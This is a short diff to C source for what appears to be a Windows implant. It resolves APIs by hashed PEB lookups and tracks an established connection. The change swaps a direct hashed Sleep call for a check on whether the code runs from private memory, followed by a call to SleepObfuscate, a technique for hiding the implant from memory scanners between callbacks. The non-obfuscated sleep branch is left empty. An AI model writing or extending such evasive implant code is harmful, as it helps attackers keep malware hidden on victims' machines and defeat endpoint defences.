@@ -169,9 +169,16 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Reset variables */
 					Inb = NULL;
 				};
-				/* ah shit!: insert obfuscate/sleep call here */
-				/* OBFUSCATe SLEEP IMPLEMENTATION GOES HERE */
-				if ( Ctx->Established != FALSE ) ( ( __typeof__( Sleep ) * ) PeGetFuncEat( PebGetModule( 0x6ddb9555 ), 0xe07cd7e ) )( 20000 );
+				if ( Ctx->Established != FALSE ) {
+					if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_PTR( Start ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
+						if ( Mbi.Type == MEM_PRIVATE ) {
+							/* Obfuscate for a brief period of time */
+							SleepObfuscate( ROGUE_WAIT_PERIOD );
+						} else {
+							/* Sleep for a brief period of time */
+						};
+					};
+				};
 			};
 		};
 
@@ -188,7 +195,8 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );
 
 	if ( Ext != NULL ) {
-		/* Execute the function with STATUS_SUCCESS */ ( ( __typeof__( RtlExitUserThread ) * ) Ext )( STATUS_SUCCESS );
+		/* Execute the function with STATUS_SUCCESS */ 
+		( ( __typeof__( RtlExitUserThread ) * ) Ext )( STATUS_SUCCESS );
 	};
 	
 	/* Abort! */
